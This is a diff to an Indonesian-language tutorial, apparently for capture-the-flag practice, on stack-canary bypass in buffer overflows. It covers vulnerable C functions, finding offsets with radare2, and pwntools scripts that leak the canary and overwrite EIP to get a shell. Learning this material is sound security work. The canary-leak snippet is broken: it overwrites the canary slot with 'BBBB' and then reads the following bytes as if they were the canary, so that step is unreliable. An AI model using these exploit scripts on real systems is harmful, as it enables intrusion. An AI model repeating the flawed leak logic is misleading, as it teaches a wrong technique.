@@ -108,4 +108,168 @@ p.interactive()  # Dapat shell!
 - **64-bit canary** = 8 byte (7 byte ditebak, 1 byte null).  
 - **Setelah dapat canary**, lanjutkan dengan **ROP/Ret2Libc** untuk bypass NX.  
 
-Dengan memahami **bit, byte, dan nilai 256**, kita bisa melakukan **brute-force canary** untuk mengeksploitasi **buffer overflow**! 🚀  
+
+
+# Func vulnerability 
+
+Canary biasanya terlibat ketika ada fungsi **tidak aman** yang membaca input user, seperti:  
+
+| Fungsi       | Deskripsi Risiko                     |
+|--------------|--------------------------------------|
+| `gets`       | **Paling berbahaya**, tidak batasi input. |
+| `scanf`      | Bisa overflow jika format `%s` tanpa batas. |
+| `strcpy`     | Menyalin string tanpa cek panjang.   |
+| `fgets`      | **Lebih aman**, tapi bisa tetap overflow jika ukuran buffer salah. |
+| `read`       | Bisa overflow jika `read(fd, buf, size)` dengan `size` terlalu besar. |
+
+### **Contoh Fungsi Vulnerable**
+```c
+// Contoh 1: gets() (paling mudah di-exploit)
+void vuln() {
+  char buf[80];
+  gets(buf);  // Bisa overflow!
+}
+
+// Contoh 2: fgets() dengan ukuran salah
+void vuln2() {
+  char buf[80];
+  fgets(buf, 200, stdin);  // Overflow karena size > kapasitas buf
+}
+```
+
+---
+
+## Menemukan Posisi Canary di Stack
+Kita akan menggunakan **radare2** untuk menganalisis binary.  
+
+### **Langkah 1: Buka Binary di r2**
+```bash
+r2 -d ./binary32   # Debug binary 32-bit
+aaa                # Analisis semua simbol
+afl                # Lihat daftar fungsi
+```
+
+### **Langkah 2: Cari Fungsi yang Rentan**
+Cari fungsi yang memanggil `gets`, `fgets`, atau `scanf`:  
+```bash
+s sym.vuln         # Pindah ke fungsi vuln
+pdf                # Disassemble fungsi
+```
+
+### **Langkah 3: Identifikasi Buffer dan Canary**
+#### **a. Cari Alokasi Buffer**
+Lihat instruksi `sub esp, X` (X = ukuran buffer):  
+```asm
+sub esp, 0x54      ; Alokasi 84 byte (0x54) di stack
+```
+
+#### **b. Cari Penyimpanan Canary**
+Canary biasanya di-load dari `gs:0x14` (32-bit) atau `fs:0x28` (64-bit):  
+```asm
+mov eax, gs:0x14    ; Load Canary
+mov [ebp-0xc], eax  ; Simpan Canary di stack (posisi ebp-0xc)
+```
+
+#### **c. Cari Awal Buffer**
+Buffer biasanya diakses via `lea` (Load Effective Address):  
+```asm
+lea eax, [ebp-0x50] ; Buffer mulai di ebp-0x50
+push eax
+call sym.imp.gets   ; Overflow di sini
+```
+
+---
+
+## **4. Hitung Offset Buffer ke Canary**
+Dari contoh di atas:  
+- **Buffer** dimulai di `[ebp-0x50]` (80 byte dari `ebp`).  
+- **Canary** disimpan di `[ebp-0xc]` (12 byte dari `ebp`).  
+
+**Rumus Offset**:  
+```
+offset_ke_canary = (pos_buffer - pos_canary)  
+                = (0x50 - 0xc)  
+                = 0x44 (68 dalam desimal)
+```
+
+---
+
+## **5. Verifikasi dengan radare2**
+### **a. Set Breakpoint dan Jalankan**
+```bash
+db sym.vuln    # Set breakpoint di fungsi vuln
+dc            # Jalankan program
+```
+
+### **b. Periksa Nilai Canary**
+```bash
+px @ ebp-0xc   # Lihat nilai Canary
+```
+Contoh output:  
+```
+[0xffffd10c]  0x1a2b3c00  0x00000000
+```
+Canary = `0x1a2b3c00`.
+
+### **c. Periksa Buffer**
+```bash
+px @ ebp-0x50  # Lihat isi buffer
+```
+
+---
+
+## **6. Eksploitasi dengan Python (pwntools)**
+### **a. Leak Canary (jika diperlukan)**
+```python
+from pwn import *
+
+p = process("./binary32")
+
+# Kirim payload sampai Canary
+payload = b"A" * 68           # Offset ke Canary
+p.send(payload + b"BBBB")     # Timpa Canary
+p.recvuntil(b"BBBB")          # Baca respons
+canary = u32(p.recv(4))       # Ambil Canary
+print(f"Canary: {hex(canary)}")
+```
+
+### **b. Timpa EIP dengan Canary yang Benar**
+```python
+payload = (
+    b"A" * 68 +              # Isi buffer
+    p32(canary) +            # Canary asli
+    b"B" * 8 +               # Jarak Canary ke EIP
+    p32(0x080491d6)          # Alamat return (ganti dengan target)
+)
+p.sendline(payload)
+p.interactive()  # Dapatkan shell/flag
+```
+
+---
+
+## **7. Kasus Khusus: Binary dengan `fgets`**
+Jika binary menggunakan `fgets`, pastikan:  
+1. **Ukuran buffer benar**:  
+   ```c
+   fgets(buf, 80, stdin);  // Aman jika ukuran <= kapasitas buf
+   ```
+2. **Jika ada overflow**, berarti ada kesalahan ukuran:  
+   ```c
+   fgets(buf, 200, stdin);  // Overflow jika buf hanya 80 byte
+   ```
+
+---
+
+## **8. Kesimpulan**
+| Langkah                | Tool/Command           | Deskripsi                     |
+|------------------------|------------------------|-------------------------------|
+| **Cari fungsi rentan** | `r2 -d binary`, `pdf`  | Analisis fungsi di radare2    |
+| **Hitung offset**      | `ebp-0x50 - ebp-0xc`   | Buffer ke Canary = 68 byte    |
+| **Leak Canary**        | `px @ ebp-0xc`         | Baca nilai Canary             |
+| **Eksploitasi**        | Python + pwntools      | Timpa EIP dengan Canary benar |
+
+Dengan langkah-langkah ini, Anda bisa **menemukan Canary** dan **mengeksploitasi buffer overflow** meskipun proteksi Canary aktif.  
+
+**Tips**:  
+- Selalu verifikasi dengan `checksec` apakah Canary aktif.  
+- Jika binary menggunakan `fgets`, pastikan ada kesalahan ukuran buffer.  
